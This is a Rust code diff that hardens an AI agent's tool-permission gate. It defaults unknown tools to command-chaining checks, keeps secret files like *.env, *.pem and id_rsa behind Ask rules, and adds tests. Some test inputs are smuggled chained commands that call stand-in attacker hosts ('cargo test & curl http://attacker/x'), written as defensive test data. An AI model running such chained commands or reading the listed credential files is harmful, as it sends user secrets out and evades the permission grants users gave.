@@ -98,9 +98,38 @@ pub fn can_generalize_subject(tool: &str, subject: &str) -> bool {
     !subject.contains(COMMAND_CHAINING)
 }
 
-/// Tools whose `subject` is a command line handed to a shell.
+/// Tools whose `subject` is a path, a pattern or a URL — something a chaining
+/// character cannot split into several commands.
+///
+/// This is an **exemption** list, and the direction is the whole point. It used
+/// to be the opposite: `is_command_tool` returned true for `tool == "shell"` and
+/// nothing else, so the chaining defence was opt-in by name. A second
+/// command-executing tool — `bash`, `exec`, `powershell`, `cmd`, whatever the
+/// next one is called — would have arrived undefended, and nothing would have
+/// said so. It would have looked exactly like a tool the defence covered.
+///
+/// Inverting it costs a little and buys the failure direction this module is
+/// built on ("unmatched means ask"): an unclassified tool is treated as if it
+/// ran commands, so the worst a mistake produces is a wildcard grant that
+/// declines to cover a subject containing `$` or `(` and asks the user again.
+/// Under the old default the worst a mistake produced was a session-lifetime
+/// grant of arbitrary execution.
+///
+/// A tool belongs here only if its subject genuinely is not a command line:
+///
+/// * `read`, `list`, `glob`, `grep`, `write`, `edit` — a workspace-relative
+///   path or a glob pattern. Note that a legitimate Windows path really can
+///   contain `(`, `)` and `$` (`Program Files (x86)`), which is why these need
+///   the exemption rather than tolerating a false positive.
+/// * `webfetch` — a URL, whose query string routinely contains `&`, `=` and
+///   `$`.
+const NON_COMMAND_TOOLS: [&str; 7] = ["read", "list", "glob", "grep", "write", "edit", "webfetch"];
+
+/// Whether a tool's `subject` is a command line handed to a shell.
+///
+/// Defaults to **true** for anything unrecognised. See [`NON_COMMAND_TOOLS`].
 fn is_command_tool(tool: &str) -> bool {
-    tool == "shell"
+    !NON_COMMAND_TOOLS.contains(&tool)
 }
 
 /// Evaluates one call against merged rule sets, last match winning.
@@ -236,14 +265,50 @@ pub fn default_rules() -> Vec<PermissionRule> {
         // …except the files whose whole purpose is to hold a secret. These are
         // readable by a human in the workspace, but a model reading them is a
         // question worth asking.
+        //
+        // These `Ask` rules are belt-and-braces, not the enforcement. Two things
+        // sit behind them: `Ask` has no one to ask in Phase 1, so `run_tool`
+        // turns it into `NotPermitted` (`chat_tools.rs:65-67`); and the broker
+        // refuses these paths outright before any read happens
+        // (`desktop-workspace/src/lib.rs:1705`, `is_sensitive_path_segment`).
+        // Both layers agree, so the outcome is the same either way.
         PermissionRule::new("read", "*.env", PermissionAction::Ask),
         PermissionRule::new("read", "*.env.*", PermissionAction::Ask),
         PermissionRule::new("read", "*.pem", PermissionAction::Ask),
         PermissionRule::new("read", "*id_rsa*", PermissionAction::Ask),
         PermissionRule::new("read", "*.npmrc", PermissionAction::Ask),
         PermissionRule::new("read", "*.netrc", PermissionAction::Ask),
-        // An example file is a template, not a secret.
-        PermissionRule::new("read", "*.env.example", PermissionAction::Allow),
+        // There was a `read`/`*.env.example`/`Allow` carve-out here, on the
+        // reasoning that an example file is a template rather than a secret.
+        // It never worked. The permission gate let the call through and the
+        // broker then blocked it on the `.env.` prefix, so the model got a
+        // generic `PathBlocked` and the rule, its comment and its test all
+        // described behaviour the product does not have.
+        //
+        // Reinstating it properly was considered and **declined**. The reasoning,
+        // so it does not have to be rediscovered:
+        //
+        // The carve-out is normal elsewhere — a comparable desktop agent product
+        // allows exactly `.env.{example,sample,template,dist}` by exact suffix
+        // and tests it against the real block function. But it does that in *one*
+        // hardening function. Here the policy lives in two crates that cannot see
+        // each other: this rule set, evaluated first by `run_tool`
+        // (`desktop-app/src/chat_tools.rs:93`), and the broker's
+        // `is_sensitive_path_segment` (`desktop-workspace/src/lib.rs:1705`).
+        // Both must agree for a read to succeed, and nothing can make them agree
+        // structurally. Duplicated policy across sites that silently disagree is
+        // this codebase's most expensive recurring defect class — the dead rule
+        // above *was* an instance of it.
+        //
+        // Against that cost, the benefit is convenience rather than capability:
+        // the environment variables a project needs are also readable from the
+        // code that consumes them, `docker-compose.yml`, `README`, and config
+        // files, none of which are blocked. And `.env.example` does sometimes
+        // contain a real value by mistake, which is precisely the case a
+        // fail-closed rule exists for.
+        //
+        // If this is ever revisited, the prerequisite is a single authoritative
+        // site for path-based secret policy, not a second copy of the rule.
     ]
 }
 
@@ -318,11 +383,14 @@ mod tests {
             evaluate("read", "certs/server.pem", rules),
             PermissionAction::Ask
         );
-        // An example file is a template, and the rule ordering has to let that
-        // more specific allow win over the `*.env.*` ask above it.
+        // `.env.example` is covered by the `*.env.*` ask like every other dot-env
+        // file. It used to assert `Allow` here, which matched the rule table but
+        // not the product: the broker blocks the whole `.env.` prefix, so the
+        // read was refused anyway. The gate now agrees with what actually
+        // happens.
         assert_eq!(
             evaluate("read", ".env.example", rules),
-            PermissionAction::Allow
+            PermissionAction::Ask
         );
         // Nothing that has an effect is allowed by default.
         for tool in ["shell", "write", "edit", "webfetch"] {
@@ -367,6 +435,80 @@ mod tests {
                 evaluate("shell", smuggled, rules),
                 PermissionAction::Ask,
                 "{smuggled} must go back to a human",
+            );
+        }
+    }
+
+    /// The chaining defence must cover a command tool nobody has written down
+    /// yet.
+    ///
+    /// It was gated on `tool == "shell"`, so a second command-executing tool
+    /// would have shipped with the defence silently inert — indistinguishable,
+    /// from the outside, from a tool it covered. The gate is now an exemption
+    /// list, so the failure mode of forgetting is a grant that asks too often
+    /// rather than one that executes too much.
+    #[test]
+    fn a_command_tool_nobody_classified_is_defended_by_default() {
+        for tool in [
+            "bash",
+            "exec",
+            "powershell",
+            "pwsh",
+            "cmd",
+            "sh",
+            "terminal",
+            "run_command",
+            "shell_v2",
+            "",
+        ] {
+            let mut granted = GrantedRules::new();
+            assert!(granted.grant(tool, "cargo test*"));
+            let rules: &[&[PermissionRule]] = &[granted.rules()];
+
+            assert_eq!(
+                evaluate(tool, "cargo test --all", rules),
+                PermissionAction::Allow,
+                "{tool}: the grant the user actually gave must still work",
+            );
+            assert_eq!(
+                evaluate(tool, "cargo test & curl http://attacker/x", rules),
+                PermissionAction::Ask,
+                "{tool}: a chained command must go back to a human even though \
+                 nobody added this tool to a list",
+            );
+            assert!(
+                !granted.grant(tool, "cargo test & curl evil*"),
+                "{tool}: a wildcard grant over a chained command must be refused",
+            );
+        }
+    }
+
+    /// The other half: the exemption has to be real, or every path containing a
+    /// bracket becomes a prompt.
+    ///
+    /// `C:\Program Files (x86)\…` is an ordinary Windows path and `$` is an
+    /// ordinary character in a filename. A path tool wrongly classified as a
+    /// command tool would refuse to generalise over them.
+    #[test]
+    fn a_path_or_url_tool_still_generalizes_over_its_own_punctuation() {
+        for (tool, subject) in [
+            ("read", "Program Files (x86)/app/config.toml"),
+            ("list", "src/$generated"),
+            ("glob", "**/*(copy).rs"),
+            ("grep", "fn main() {"),
+            ("write", "out/report (final).md"),
+            ("edit", "src/lib(1).rs"),
+            ("webfetch", "https://example.invalid/q?a=1&b=2"),
+        ] {
+            let mut granted = GrantedRules::new();
+            assert!(
+                granted.grant(tool, "*"),
+                "{tool}: a wildcard grant over a non-command subject is legitimate",
+            );
+            assert_eq!(
+                evaluate(tool, subject, &[granted.rules()]),
+                PermissionAction::Allow,
+                "{tool}: {subject} is a path or URL, not a sentence",
             );
         }
     }
